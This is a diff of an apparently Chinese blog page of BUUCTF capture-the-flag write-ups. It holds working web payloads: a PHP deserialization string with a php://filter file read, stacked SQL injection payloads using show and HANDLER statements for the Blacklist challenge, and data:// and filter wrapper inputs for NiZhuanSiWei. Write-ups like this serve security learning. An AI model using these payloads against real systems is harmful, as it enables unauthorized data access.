 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>=<span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> =<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><br>O:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot; * op&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot; * filename&quot;</span>;s:<span class="hljs-number">57</span>:<span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot; * content&quot;</span>;N;&#125;<br></code></pre></td></tr></table></figure>
 
 <p>将乱码修改传入url</p>
-<p>?str&#x3D;O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:57:”php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php”;s:7:”content”;N;}</p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-operator">?</span><span class="hljs-variable">str</span><span class="hljs-operator">=</span><span class="hljs-built_in">O</span><span class="hljs-operator">:</span><span class="hljs-number">11</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;FileHandler&quot;</span><span class="hljs-operator">:</span><span class="hljs-number">3</span><span class="hljs-operator">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">2</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;op&quot;</span><span class="hljs-operator">;</span><span class="hljs-variable">i</span><span class="hljs-operator">:</span><span class="hljs-number">2</span><span class="hljs-operator">;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">8</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;filename&quot;</span><span class="hljs-operator">;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">57</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span><span class="hljs-operator">;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">7</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;content&quot;</span><span class="hljs-operator">;</span><span class="hljs-built_in">N</span><span class="hljs-operator">;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
 <p><img src="/2026/02/10/BUUCTF/image-20260210234758038.png" srcset="/img/loading.gif" lazyload alt="image-20260210234758038"></p>
 <p>base64解码</p>
 <p><img src="/2026/02/10/BUUCTF/image-20260210234754031.png" srcset="/img/loading.gif" lazyload alt="image-20260210234754031"></p>
 <h1 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h1><p><img src="/2026/02/10/BUUCTF/image-20260210234801989.png" srcset="/img/loading.gif" lazyload alt="image-20260210234801989"></p>
 <p>是一个注入界面，想到了模板注入试了一下发现好像都不是，就想到了sql注入，先测试一下是不是字符注入</p>
 <p>测试1’</p>
-<p>error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘’1’’’ at line 1</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">error <span class="hljs-number">1064</span> : You have an error <span class="hljs-keyword">in</span> your <span class="hljs-keyword">SQL</span> syntax; <span class="hljs-keyword">check</span> the manual that corresponds <span class="hljs-keyword">to</span> your MariaDB server version <span class="hljs-keyword">for</span> the <span class="hljs-keyword">right</span> syntax <span class="hljs-keyword">to</span> use near <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;&#x27;&#x27; at line 1</span><br></code></pre></td></tr></table></figure>
+
 <p>尝试了联合注入，好像不对，就尝试堆叠注入</p>
-<p>测试1’;show databases;</p>
+<p>测试</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27;;<span class="hljs-keyword">show</span> databases;<br></code></pre></td></tr></table></figure>
+
 <p><img src="/2026/02/10/BUUCTF/image-20260210234805803.png" srcset="/img/loading.gif" lazyload alt="image-20260210234805803"></p>
-<p>测试1’;show tables;</p>
+<p>测试</p>
+<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q"><span class="hljs-number">1</span>&#x27;;<span class="hljs-built_in">show</span> <span class="hljs-built_in">tables</span>;<br></code></pre></td></tr></table></figure>
+
 <p><img src="/2026/02/10/BUUCTF/image-20260210234809635.png" srcset="/img/loading.gif" lazyload alt="image-20260210234809635"></p>
 <p>看到存在FlagHere的表名，测试字段数</p>
 <p>上面说的测试联合注入感觉不对其实是我第一次闭合符用错了，我一开始用的是–+，但这里要用– -</p>
-<p>测试1’order by 3 – -</p>
+<p>测试</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>&#x27;<span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">3</span> -- -<br></code></pre></td></tr></table></figure>
+
 <p><img src="/2026/02/10/BUUCTF/image-20260210234814012.png" srcset="/img/loading.gif" lazyload alt="image-20260210234814012"></p>
 <p>存在报错</p>
-<p>测试1’order by 2 – -</p>
+<p>测试</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>&#x27;<span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">2</span> -- -<br></code></pre></td></tr></table></figure>
+
 <p><img src="/2026/02/10/BUUCTF/image-20260210234817816.png" srcset="/img/loading.gif" lazyload alt="image-20260210234817816"></p>
 <p>没有报错，说明是有2个字段</p>
 <p>想进行联合注入，发现select被过滤了</p>
 <p><img src="/2026/02/10/BUUCTF/image-20260210234821651.png" srcset="/img/loading.gif" lazyload alt="image-20260210234821651"></p>
-<p>测试1’;show columns from FlagHere;</p>
+<p>测试</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-number">1</span>&#x27;;<span class="hljs-built_in">show</span> <span class="hljs-built_in">columns</span> from FlagHere;<br></code></pre></td></tr></table></figure>
+
 <p><img src="/2026/02/10/BUUCTF/image-20260210234826080.png" srcset="/img/loading.gif" lazyload alt="image-20260210234826080"></p>
-<p>测试1’;show columns from flag;</p>
+<p>测试</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-number">1</span>&#x27;;<span class="hljs-built_in">show</span> <span class="hljs-built_in">columns</span> from flag;<br></code></pre></td></tr></table></figure>
+
 <p><img src="/2026/02/10/BUUCTF/image-20260210234831797.png" srcset="/img/loading.gif" lazyload alt="image-20260210234831797"></p>
-<p>测试1’;handler FlagHere open;handler FlagHere read first;handler FlagHere close;</p>
+<p>测试</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-number">1</span>&#x27;;handler FlagHere open;handler FlagHere <span class="hljs-built_in">read</span> <span class="hljs-built_in">first</span>;handler FlagHere <span class="hljs-built_in">close</span>;<br></code></pre></td></tr></table></figure>
+
 <p><img src="/2026/02/10/BUUCTF/image-20260210234838843.png" srcset="/img/loading.gif" lazyload alt="image-20260210234838843"></p>
 <h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p>用data和filter伪协议</p>
-<p>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?<span class="hljs-type">text</span>=data://<span class="hljs-type">text</span>/plain,welcome <span class="hljs-keyword">to</span> the zjctf&amp;file=php://<span class="hljs-keyword">filter</span>/<span class="hljs-keyword">read</span>=convert.base64-encode/resource=useless.php<br></code></pre></td></tr></table></figure>
+
 <p>得到一串base64编码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file); <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
@@ -2723,7 +2768,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2026年6月6日</div>
+          <div>2026年7月12日</div>
         </div>
       
       
